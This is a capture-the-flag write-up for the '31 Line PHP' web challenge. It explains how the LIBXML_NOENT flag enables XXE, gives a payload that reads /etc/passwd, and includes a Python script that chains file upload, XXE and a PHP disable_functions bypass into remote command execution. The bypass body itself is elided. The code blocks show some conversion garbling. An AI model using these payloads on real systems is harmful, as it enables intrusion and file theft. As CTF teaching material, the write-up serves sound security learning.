@@ -1,0 +1,179 @@
+<h1>31 Line PHP</h1>
+
+<h2>Description</h2>
+
+<p>Like the legendary ~~one-~~ 31- line php challenge</p>
+
+<p><strong><code>62.84.114.238/</code></strong></p>
+
+<p><em>On the last step, you’ll need a recently published 0day.</em></p>
+
+<h2>Solution</h2>
+
+<p>Here's the challenge source code:</p>
+
+<p>```php
+<?php
+session<em>start();
+if (!isset($</em>POST["data"])) {
+    highlight<em>file(<strong>FILE</strong>);
+    die();
+}
+if (!isset($</em>SESSION["id"])) {
+    $<em>SESSION["id"] = md5(random</em>bytes(16));
+}
+$id = $_SESSION["id"];
+echo "Welcome, $id\r\n";</p>
+
+<p>if (!file<em>exists("/var/www/html/upload/" . $id)) {
+    mkdir("/var/www/html/upload/" . $id, 0755, true);
+}
+$name = $</em>FILES["data"]["name"];
+move<em>uploaded</em>file($<em>FILES["data"]["tmp</em>name"],"/var/www/html/upload/$id/$name");
+if (PHP<em>VERSION</em>ID &lt; 80000) {
+    // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
+    // disabled by default, so this function is no longer needed to protect against XXE attacks.
+    $loader = libxml<em>disable</em>entity<em>loader(true);
+}
+$xmlfile = file</em>get<em>contents("/var/www/html/upload/$id/$name");
+$dom = new DOMDocument();
+$dom->loadXML($xmlfile, LIBXML</em>NOENT);
+$creds = simplexml<em>import</em>dom($dom);
+$user = $creds->user;
+$pass = $creds->pass;
+echo "You have logged in as user $user";
+unlink("/var/www/html/upload/$id/$name");
+?>
+```</p>
+
+<h3>XXE Injection</h3>
+
+<p>We can quite clearly see that this must have something to do with XML parsing. One part of the code stood out in particular:</p>
+
+<p><code>php
+if (PHP_VERSION_ID &lt; 80000) {
+    // This function has been deprecated in PHP 8.0 because in libxml 2.9.0, external entity loading is
+    // disabled by default, so this function is no longer needed to protect against XXE attacks.
+    $loader = libxml_disable_entity_loader(true);
+}
+</code></p>
+
+<p>The comments seem reasonable. Does this mean that there is no XXE here?</p>
+
+<p>It turns out that this part was inspired by a <a href="https://blog.sonarsource.com/wordpress-xxe-security-vulnerability">WordPress bug</a> a while back this year. While the above justification is correct, the nuance lies in how <code>loadXML()</code> is called.</p>
+
+<p>It turns out that the <code>LIBXML_NOENT</code> flag actually <em>enables</em> entity substitution - the flag means that no entities will be left in the result, i.e. external entities will be fetched and substituted.</p>
+
+<p><code>php
+$dom-&gt;loadXML($xmlfile, LIBXML_NOENT);
+</code></p>
+
+<p>So, surprisingly, we <em>do</em> have an XXE here. Here's an LFI payload:</p>
+
+<p>```
+------WebKitFormBoundaryO6d3yhN5GpxEyAKE
+Content-Disposition: form-data; name="data"; filename="test.xml"
+Content-Type: text/xml</p>
+
+<p><!DOCTYPE myDoc [ <!ENTITY myExternalEntity SYSTEM "file:///etc/passwd" &gt; ]&gt;
+<creds>
+    <user>&myExternalEntity;</user>
+    <pass>mypass</pass>
+</creds>
+------WebKitFormBoundaryO6d3yhN5GpxEyAKE
+Content-Disposition: form-data; name="data"</p>
+
+<p>test
+------WebKitFormBoundaryO6d3yhN5GpxEyAKE--
+```</p>
+
+<h3>PHP Code Injection</h3>
+
+<p>I started searching for flag files but had no luck. After asking the organizers, they confirmed that I must get an RCE somehow.</p>
+
+<p>This got me looking back at the source code. Note that we have a remote file upload here - the uploaded file is at <code>/var/www/html/upload/$id/$name</code> and we have access to this file through the web server (the web root is <code>/var/www/html</code>). The only caveat is that the file is deleted as soon as the XML parsing is done.</p>
+
+<p>This still allows us to request the file <em>while</em> the XML parsing is being performed. If we upload a PHP file, we can request that file again within the XML and use <code>php://filter/</code> to reflect the output into the <code>&lt;user&gt;</code> tag.</p>
+
+<p>```
+<!DOCTYPE foo [ <!ELEMENT foo ANY &gt;
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/89e05a8b6e028eeda25a0845b9b3daaa/payload.php" &gt;]&gt;
+<creds>
+    <user>&xxe;</user>
+    <pass></pass>
+</creds></p>
+
+<p><?php phpinfo(); ?>
+```</p>
+
+<p>Using the <code>phpinfo()</code> output, we can see the <code>disable_functions</code> configuration.</p>
+
+<p><img src="../../.gitbook/assets/image (79) (1) (1).png" alt="" /></p>
+
+<p>As we can see, all of the functions that can give us a shell command execution are disabled.</p>
+
+<h3>disable_functions Bypass</h3>
+
+<p>The challenge hinted at a zero-day being needed for the last step.</p>
+
+<p>A recent (published just 5 days ago) <a href="https://github.com/mm0r1/exploits/tree/master/php-filter-bypass">PoC</a> allowed us to bypass <code>disable_functions</code> on all PHP versions.</p>
+
+<p>This allowed us to get shell RCE and run the <code>/readflag</code> binary to read the flag.</p>
+
+<p>```python
+import requests
+import re
+import base64</p>
+
+<p>FILENAME = 'payload.php'
+TARGET = 'http://62.84.114.238'
+COMMAND = '/readflag'</p>
+
+<p>with open(FILENAME, 'w') as f:
+    f.write("""
+<!DOCTYPE foo [ <!ELEMENT foo ANY &gt;
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/3354e780fbef91d0ebc5875d77aee578/{}" &gt;]&gt;
+<creds>
+    <user>&xxe;</user>
+    <pass></pass>
+</creds>
+    """.format(FILENAME) + """
+<?php</p>
+
+<h1>PHP 7.0-8.0 disable_functions bypass PoC (*nix only)</h1>
+
+<p>#</p>
+
+<h1>Bug: https://bugs.php.net/bug.php?id=54350</h1>
+
+<h1> </h1>
+
+<h1>This exploit should work on all PHP 7.0-8.0 versions</h1>
+
+<h1>released as of 2021-10-06</h1>
+
+<p>#</p>
+
+<h1>Author: https://github.com/mm0r1</h1>
+
+<p>pwn('{}');""".format(COMMAND) + r"""</p>
+
+<p>... EXPLOIT HERE ...</p>
+
+<p>?>
+""")</p>
+
+<p>r = requests.post(TARGET,
+    files = {'data': (FILENAME, open(FILENAME, 'rb'))},
+    data = {'data': 'test'},
+    headers = {'Cookie': 'PHPSESSID=85ab80ed3e1f88a7827a75c5f9dc7c1f'}
+)</p>
+
+<p>print(r.text)</p>
+
+<p>match = re.search('You have logged in as user (.*)', r.text)
+print(match[1])
+print(base64.b64decode(match[1]).decode())
+```</p>
+
+<p>The flag is <code>spbctf{XX3_2_rCe_w3Ll_D0n3}</code>\</p>
